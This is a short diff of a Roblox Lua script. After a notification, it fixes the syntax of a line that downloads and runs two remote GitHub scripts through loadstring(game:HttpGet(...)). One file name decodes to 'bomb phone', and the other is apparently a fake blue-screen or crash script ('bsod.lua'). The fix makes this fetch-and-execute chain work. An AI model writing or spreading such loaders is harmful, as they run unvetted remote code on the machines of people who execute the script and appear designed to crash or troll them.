@@ -20,4 +20,4 @@ CoreGui:SetCore("SendNotification", {
     Duration = 10, 
 })
 wait(1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/UI-library/main/%E8%BD%B0%E7%82%B8%E6%89%8B%E6%9C%BA.lua", true))();loadstring(game:HttpGet'https://github.com/RunDTM/roblox-bluescreen/raw/main/bsod.lua'))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/UI-library/main/%E8%BD%B0%E7%82%B8%E6%89%8B%E6%9C%BA.lua", true))();loadstring(game:HttpGet('https://github.com/RunDTM/roblox-bluescreen/raw/main/bsod.lua'))
